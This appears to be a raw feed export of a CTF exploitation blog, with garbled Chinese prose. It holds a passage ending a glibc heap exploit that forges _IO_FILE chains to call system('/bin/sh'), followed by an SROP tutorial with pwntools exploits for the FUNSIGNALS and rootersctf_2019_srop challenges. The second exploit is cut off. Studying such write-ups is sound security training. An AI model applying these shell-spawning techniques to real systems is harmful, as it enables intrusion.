class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(system_addr) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>bin_sh_addr = heap_base + <span class="hljs-number">0xA00</span><br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64((bin_sh_addr - <span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Exp-House-of-Corrosion"><a class="header-anchor" href="#Exp-House-of-Corrosion">Â¶</a>Exp.House of Corrosion</h3><h1>å‚è€ƒèµ„æ–™</h1><p><a href="https://fmyy.pro/">è‚¥çŒ«å˜¤å˜¤â€™s blog</a></p><p><a href="https://www.anquanke.com/post/id/202387">house-of-huskå­¦ä¹ ç¬”è®°</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop">raycp å¸ˆå‚…çš„ _IO_FILE ç³»åˆ—æ–‡ç« </a></p><p><a href="https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie">_IO_FILEåˆ©ç”¨æ€è·¯æ€»ç»“ - b0ldfrev</a></p><p><a href="https://bbs.pediy.com/thread-272098.htm">CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“ - winmt</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/posts/341e3484.html"/>
    <url>/posts/341e3484.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ„Ÿè§‰åˆ°éš¾å¤§æ¦‚æ˜¯å› ä¸ºè¿˜æ²¡å­¦ä¼šç½¢ï¼Œæ„¿åœ¨æŒæ¡ä¹‹åå†å›å¤´çœ‹èƒ½çœ‹åˆ°ä¸ä¸€æ ·çš„é£æ™¯ã€‚</p></blockquote><h1>SROP(Sigreturn Oriented Programming)</h1><h2 id="ç†è§£"><a class="header-anchor" href="#ç†è§£">Â¶</a>ç†è§£</h2><p>ç½‘ä¸Šå¾ˆå¤šå¤§ä½¬åŸç†å†™çš„å¾ˆå¥½äº†ï¼Œæˆ‘è¿™é‡Œå°±å†™ç‚¹è‡ªå·±æƒ³æ³•ã€‚</p><p>é¦–å…ˆäº†è§£ä¸€ä¸‹ï¼Œsignal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/ProcessOfSignalHandlering.png" alt=""></p><p>ä½ ä¸æ‡‚æ²¡å…³ç³»ï¼ˆ<s>æˆ‘ä¹Ÿä¸æ‡‚</s>ï¼‰ï¼Œç®€å•æ¥è¯´ä½ å‘é€ signal çš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠä½ çš„å¯„å­˜å™¨å’Œ signal ä¿¡æ¯å­˜åˆ°ä½ çš„ç”¨æˆ·æ ˆé‡Œï¼Œç„¶åè·³åˆ°å†…æ ¸æ€å»å¤„ç† signalï¼Œå†…æ ¸è¿”å›ç”¨æˆ·æ€æ‰§è¡Œä¿¡å·å¤„ç†ä¹‹å‰ï¼Œä¼šè®¾ç½®ä¿¡å·å¤„ç†å‡½æ•°çš„è¿”å›åœ°å€(x30)æŒ‡å‘[vdso]ä¸­çš„ <strong>__kernel_rt_sigreturn</strong> å‡½æ•°ï¼Œæ¥ä»æ ˆä¸­æ¢å¤å–å‡ºä¹‹å‰æ‰€å­˜çš„ä¿¡æ¯ï¼ˆ<strong>æ— æ£€éªŒ</strong>ï¼‰ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ã€‚æˆ‘ä»¬è‡ªå·±å†™ä¸€ç³»åˆ—ç²¾å¿ƒæ„é€ çš„æ•°æ®ï¼Œä¼ªè£…æˆæˆ‘ä»¬çš„å¯„å­˜å™¨å’Œ signal ä¿¡æ¯ï¼Œç„¶åå…ˆæŠŠè¿”å›åœ°å€è¦†ç›–æˆ <strong>Sigreturn</strong> ï¼Œåé¢ç´§è·Ÿç€æˆ‘ä»¬è‡ªå·±æ„é€ å¥½çš„å¯„å­˜å™¨å’Œ signal ä¿¡æ¯ï¼Œç›¸å½“äºæˆ‘ä»¬æ¶æ„åˆ©ç”¨äº†è¿™ä¸ªæ¢å¤æœºåˆ¶ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶ rip rsp åœ¨å†…çš„æ‰€æœ‰å¯„å­˜å™¨ï¼Œé‚£ä¹ˆè‡ªç„¶å°±å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œäº†ã€‚</p><p>è¿›ä¸€æ­¥ï¼Œå¦‚æœçŸ¥é“ <code>/bin/sh</code> çš„åœ°å€ï¼Œå­˜åœ¨ syscall ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å¦‚ä¸‹æ„é€ å°±å¯ä»¥ getshell ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/srop-example-1.png" alt=""></p><p>ä½†ä¸€èˆ¬ç¨‹åºæ˜¯ä¸ä¼šç›´æ¥ç»™ä½  <code>/bin/sh</code> çš„ï¼Œä½ éœ€è¦è‡ªå·±é€šè¿‡ read å¾€æŸä¸ªåœ°å€å†™ã€‚è¿™å°±éœ€è¦æ„é€  SROP é“¾ï¼ˆå…³é”®gadgetï¼š<code>syscall;ret</code>ï¼‰ï¼Œå…·ä½“çš„æˆ‘ä»¬ä¸‹é¢çœ‹å‡ ä¸ªé¢˜ã€‚</p><hr><h2 id="åˆ©ç”¨å‰æ"><a class="header-anchor" href="#åˆ©ç”¨å‰æ">Â¶</a>åˆ©ç”¨å‰æ</h2><p>å¤§æ¦‚æ˜¯ï¼š</p><ol><li>syscallï¼Œsignal æ²¡ syscall ğŸ‘¦ ç©æ¯› ã€‚</li><li>è¶³å¤Ÿå¤§çš„æº¢å‡ºç©ºé—´ï¼Œè¦èƒ½æ”¾å¾—ä¸‹ä¼ªé€ çš„ Frameã€‚</li><li>å¥½ç”¨çš„ gadget ï¼ˆéå¿…è¦,è¯¦è§ <code>smallest</code>ï¼‰ï¼Œæ¯”å¦‚ pop rax ä¹‹ç±»çš„ï¼Œå°±ç®—æ²¡æœ‰ <strong>Sigreturn</strong> ï¼Œx64 ä¸‹æŠŠ rax è°ƒåˆ° 15 åæ‰§è¡Œ syscall æ˜¯ä¸€æ ·çš„æ•ˆæœã€‚</li></ol><p>ä¸€èˆ¬æ€è·¯æ˜¯æƒ³åŠæ³•æåˆ° <code>/bin/sh</code> çš„ä½ç½®ï¼ˆæ²¡æœ‰å°±å†™ä¸€ä¸ªï¼‰ååˆ©ç”¨ SROP æ‰§è¡Œ execve ï¼Œå…¶ä»–çš„æˆ‘ä¸å¥½è¯´ï¼Œç›´æ¥çœ‹é¢˜å§ã€‚</p><hr><h2 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h2><p>é¢ï¼Œå¤§æ¦‚æ˜¯ä»æ˜“åˆ°éš¾å§ã€‚åé¢è¦æ˜¯è¿½åŠ å°±ä¸ç®—äº†ã€‚</p><h3 id="FUNSIGNALSï¼ˆç™½ç»™çš„-Sigreturnï¼‰"><a class="header-anchor" href="#FUNSIGNALSï¼ˆç™½ç»™çš„-Sigreturnï¼‰">Â¶</a>FUNSIGNALSï¼ˆç™½ç»™çš„ Sigreturnï¼‰</h3><h4 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h4><p>ä¸¢åˆ° IDA é‡Œé¢å»ï¼Œå•çº¯çš„ SROP é¢˜ç›®éƒ½æ˜¯æ¯”è¾ƒç®€æ´çš„ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329111928988.png" alt="image-20220329111928988"></p><p>é¦–å…ˆè¦çœ‹æ‡‚è¿™ä¸ªç¨‹åºï¼š</p><ol><li><code>mov dh, 4</code> çš„æ„æ€åœ¨è¿™é‡Œæ˜¯ <code>RDX = 0x400</code>ï¼Œä¸æ¸…æ¥šçš„è¯å¯ä»¥å» gdb ä¸‹æ–­ç‚¹åæŒ‰ r å†è·‘ä¸€éè‡ªå·±éªŒè¯ã€‚`</li><li>å¼€å¤´åˆ°ç¬¬ä¸€ä¸ª syscall æ„æ€å°±æ˜¯åœ¨ rsp çš„åœ°æ–¹è¯»å…¥ 0x400 çš„æ•°æ®ã€‚</li><li>é¢˜ç›®è´´å¿ƒçš„æ˜¯ï¼Œåé¢çš„ <code>push 0xF pop rax syscall</code>ï¼Œç›¸å½“äºç›´æ¥è°ƒç”¨äº† <strong>Sigreturn</strong> äº†ï¼ˆRAX = 15ï¼‰ã€‚åé¢çš„ <code>int 3</code> ä½ ä¸ç”¨ç®¡å®ƒï¼Œæˆ‘ä»¬ Sigreturn çš„æ˜¯è‡ªå·±æ„é€ çš„ Frame ï¼ŒæŠŠ rsp å’Œ rip ğŸ‘ äº†å°±æ²¡å®ƒçš„äº‹äº†ã€‚</li></ol><p>æˆ‘ä»¬è¦å¹²çš„äº‹ä¹Ÿå¾ˆç®€å•ï¼Œç®€å•çš„æ„é€ ä¸€ä¸ªæ¶æ„ Frame ï¼Œç”¨ write å»æ³„éœ²è¿™ä¸ª flag ã€‚ç›´æ¥è°ƒç”¨ pwntools æ„é€ ã€‚</p><h4 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br><br>p = process(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;hack.bckdr.in&#x27;,17002)</span><br>elf = ELF(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br>frame=SigreturnFrame()<br>frame.rax = constants.SYS_write <span class="hljs-comment"># 1 is ok</span><br>frame.rdi = constants.STDOUT_FILENO <span class="hljs-comment"># 1 is ok</span><br>frame.rsi = elf.sym[<span class="hljs-string">&#x27;flag&#x27;</span>]<br>frame.rdx = <span class="hljs-number">100</span><br>frame.rip = elf.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br><br>p.sendline(<span class="hljs-built_in">str</span>(frame))<br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 id="rootersctf-2019-sropï¼ˆpop-rax-æ„é€ çš„-Sigreturnï¼‰"><a class="header-anchor" href="#rootersctf-2019-sropï¼ˆpop-rax-æ„é€ çš„-Sigreturnï¼‰">Â¶</a>rootersctf_2019_sropï¼ˆpop rax æ„é€ çš„ Sigreturnï¼‰</h3><h4 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h4><p>ç¨‹åºé€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼šå…ˆè¾“å‡º data æ®µ buf å†…çš„ä¿¡æ¯ï¼Œå¾€ <code>rsp-0x40</code> å¤„å†™å…¥ <code>0x400</code> çš„æ•°æ®ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329141956305.png" alt="image-20220329141956305"></p><p>è¿™é¢˜æ²¡æœ‰ç™½ç»™çš„ Sigreturn ï¼Œä½†æ˜¯æœ‰ä¸ªå¾ˆå¥½ç”¨çš„ gadget <code>pop rax syscall</code> ã€‚</p><p>åŸºæœ¬æ€è·¯æ˜¯ï¼šç¬¬ä¸€æ¬¡ä¼ªé€  Frame åœ¨å·²çŸ¥åœ°å€å¤„å†™å…¥ <code>/bin/sh</code> ï¼Œç¬¬äºŒæ¬¡ä¼ªé€  Frame è¿›è¡Œä¸€ä¸ª <code>/bin/sh</code> çš„ <code>execve</code> ã€‚</p><p>é¦–å…ˆï¼Œ æ ˆæº¢å‡ºè¦†ç›– rip ä¸º <code>pop rax;syscall;leave;retn</code> è¿™ä¸ª gadgetï¼Œåé¢ç´§è·Ÿ Sigreturn è°ƒç”¨å· 15 å’Œ ç¬¬ä¸€ä¸ªä¼ªé€ çš„ Frameã€‚</p><p>æœ‰å¿…è¦è¯´æ˜ä¸€ä¸‹ Frame å…·ä½“çš„æ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><span class="hljs-comment"># read è°ƒç”¨å·</span><br>fuck.rdi = <span class="hljs-number">0</span><span class="hljs-comment"># fd</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><span class="hljs-comment"># buf</span><br>fuck.rdx = <span class="hljs-number">0x400</span><span class="hljs-comment"># count ä¸è¦å†™å°äº†ï¼Œæ²¡ä½ å¥½æœæ±åƒ(á—œ_á—œï¼‰</span><br>fuck.rip = syscall_ret<span class="hljs-comment"># syscall;leave;retn</span><br>fuck.rsp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss æ®µå·²çŸ¥åœ°å€</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss æ®µå·²çŸ¥åœ°å€</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬é¢„æœŸä¸­çš„ç¨‹åºæµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><ol><li>Sigreturn æ¢å¤æ¶æ„ Frame åˆ°å¯„å­˜å™¨ ï¼Œç´§æ¥ç€æ‰§è¡Œçš„æ˜¯ Frame ä¸­çš„ rip ä¹Ÿå°±æ˜¯ <code>syscall;leave;ret</code> ï¼Œé‚£ä¹ˆ <code>syscall</code> å°±ä¼šå…ˆåœ¨ <code>0x402500</code> å¤„è¯»å…¥ <code>0x400</code> çš„æ•°æ®ï¼ˆROPé“¾++ï¼‰ã€‚</li><li><code>leave;ret</code> æ„æ€æ˜¯ <code>mov rsp,rbp;pop rbp;pop rip</code> ï¼Œ<code>mov rsp,rbp</code>å› ä¸ºæˆ‘ä»¬æ„é€ çš„æ˜¯ä¸€æ ·çš„åœ°å€æ‰€ä»¥æ²¡å½±å“ï¼Œ<code>pop rbp</code> ä¼šæŠŠæˆ‘ä»¬ ROP é“¾çš„å‰å…«ä¸ªå­—èŠ‚ç»™ ğŸ‘ äº†ã€‚æ‰€ä»¥æˆ‘ä»¬è¦åœ¨ ROP é“¾ä¸Šå…ˆå¡«å…… 8 å­—èŠ‚çš„åƒåœ¾ rbp åœ°å€ï¼Œé‚£ä¹ˆ <code>pop rip</code> æ—¶å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„ ROP é“¾ã€‚ï¼ˆæ˜¯ä¸æ˜¯æ„Ÿè§‰æœ‰ç‚¹æ ˆè¿ç§»é‚£å‘³ğŸ‘¦ï¼‰</li></ol><p>ROP é“¾æˆ‘ä»¬æ˜æ˜¾è¦ç”¨æ¥ä¼ªé€ ç¬¬äºŒä¸ª Frameï¼Œæˆ‘ä»¬åœ¨ <code>0x402500</code> å†™å…¥ ROP é“¾åŒæ—¶æˆ‘ä»¬é¡ºå¸¦å†™ä¸Š <code>/bin/sh\0</code>ï¼Œå…·ä½“çš„ç›´æ¥çœ‹ Exp ã€‚</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:0000000000401032                 pop     rax</span><br><span class="hljs-string">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:0000000000401035                 leave</span><br><span class="hljs-string">.text:0000000000401036                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rax_syscall_leave_ret = <span class="hljs-number">0x401032</span><br>syscall_ret = <span class="hljs-number">0x401033</span><br>fuck = 